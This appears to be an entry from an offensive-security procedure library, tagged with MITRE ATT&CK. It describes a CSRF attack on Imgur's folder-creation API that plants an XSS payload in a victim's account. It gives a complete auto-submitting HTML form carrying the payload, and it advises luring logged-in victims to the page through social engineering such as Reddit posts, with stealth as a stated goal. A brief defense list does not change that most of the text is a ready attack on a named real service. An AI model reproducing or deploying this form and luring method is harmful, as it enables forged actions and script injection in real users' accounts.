---
tags:
  - csrf
  - imgur
  - folder-creation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:56:03.937Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 94289aba-916f-4f3e-af4e-f5974e13796d
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Malicious-Favorites-Folder-via-CSRF

## Summary

This procedure exploits the lack of CSRF protection on Imgur's folder creation endpoint to create a favorites folder with an arbitrary name containing an XSS payload, setting the stage for stored self-XSS.

## Description

The Imgur API endpoint https://api.imgur.com/3/folders allows POST requests to create folders without proper CSRF tokens, enabling attackers to forge requests from a malicious site. The folder name is not sanitized, allowing injection of HTML/JS payloads like '<img src=x onerror=prompt(1)>'. This affects authenticated users visiting attacker-controlled pages, creating the folder silently in their account. Prerequisites include the victim being logged into Imgur; outcomes include a malicious folder ready for XSS triggering.

## Requirements

1. Victim authenticated to Imgur in their browser
2. Attacker control over a web page (e.g., hosted on a server)
3. Knowledge of Imgur API structure for POST payload

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing API endpoints
- Sanitize and escape folder names to prevent HTML/JS injection
- Monitor for anomalous folder creations from unusual referers

## Objectives

1. Silently create a folder with XSS payload in the victim's account
2. Prepare for self-XSS execution on user interaction
3. Maintain stealth by avoiding direct user prompts

## Instructions

### Step 1: Prepare Malicious HTML Form

**Context**: Craft an auto-submitting form targeting the vulnerable endpoint to inject the payload.

Create an HTML file with the following content:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://api.imgur.com/3/folders" method="POST">
  <input type="hidden" name="name" value='"'><img src=x onerror=prompt(1)>'>
  <input type="hidden" name="is_private" value="false">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

> This form auto-submits on load, forging the request using the victim's session cookies.

### Step 2: Host and Distribute the Page

**Context**: Serve the HTML to lure the victim into visiting it while logged in.

Host the file on a web server (e.g., python -m http.server 8000) and share the URL via social engineering, such as a Reddit post in Imgur-related communities.

> Expected: Victim's browser creates the folder upon page load.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[imgur]]
- [[api-exploitation]]
